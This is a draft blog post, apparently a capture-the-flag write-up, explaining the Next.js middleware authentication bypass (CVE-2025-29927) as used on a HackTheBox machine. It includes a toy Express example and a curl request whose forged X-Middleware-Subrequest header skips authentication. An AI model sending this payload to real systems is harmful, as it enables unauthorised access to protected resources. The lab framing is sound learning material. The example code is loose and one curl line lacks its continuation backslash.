---
date: '2026-01-16T15:50:00-05:00'
draft: true
title: '16JAN26 - NextJS Authentication Bypass '
tags:
  - Javascript
  - Exploits
  - HTB
  - Next.js
---
## Intro 
Today while messing around with one of the HackTheBox retired machines "Previous", the method of gaining initial access is due to the "Middleware" Authentication Bypass in Next.js. This vulnerability can be exploited to bypass authorization and access sensitive pages. Details of the affected versions can be found here [CVE-2025-29927](https://www.cve.org/CVERecord?id=CVE-2025-29927). 

## Background
The CVE is a vulnerability in the handling of "middleware". In its simplest terms (the only ones I understand) middleware is a function used to process a user request in some form or fashion. This could be as simple as parsing raw data into a JSON template, or as much as providing authentication to an application that doesn't have any. In the case of the HackTheBox machine, this was the case. The application uses [Next Auth](https://next-auth.js.org/) as its authentication provider. In an incredibly oversimplified piece of pseudocode, authentication in this application looks like this (forgive me im not a javascipt developer).

```
const express = require('express');
const app = express();

// the authentication middleware
app.use((req, res, next) => {
  if (password === 'Thaddeus'){
    next();
  }else{
    // Empty Code Block
  }
});

// Route handler
app.get('/', (req, res) => {
  res.send('Hello World!');
});

app.listen(8080, () => {
  const password = prompt("Enter your password here:");
});
```
In this code, the application simply asks for a user's password upon requesting the webpage, providing the password the user is redirected to the middleware code which validates the password is correct. If the password is correct it uses the `next()` function to continue to the application, which simply printe "Hello World!". These middleware steps can be chained to execute multiple stages in sequence before proceeding. In this piece of code, there is no code in the "else" block, which would make the application hang if the password is incorrect which i suspect is happening in the "Previous" machine as it has this behavior. 

## So how does this work?
The vulnerability happens due to inconstent handling of the `x-middleware-subrequest` header, which is included in protected resource requests. The vulnerability exists because Next.Js 15.2 introduced a maximum depth of 5 middleware functions that can be handled. If an application gets a request with 5 or more middleware identified, it bypasses the middleware entirely and proceeds to the route, which in the case of data parsing can lead to an application crash, but in the case of authentication means the user is able to completely bypass authentication. 

## How can i use it
Using the exploit is as simple as taking the request for the application in question and adding 5 fake middleware identifiers within an `x-middleware-subrequest` header. In the case of the fake application above that can look like this. 

```
curl -v "http://fakewebsite.com/" \
-H "Host: fakewebsite.com"
-H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" \
-H "Accept-Language: en-US,en;q=0.9" \
-H "Connection: keep-alive"
```

Adding the `X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware` will effectively skip the authentication step and go directtly to the requested resource and print "Hello, World!". 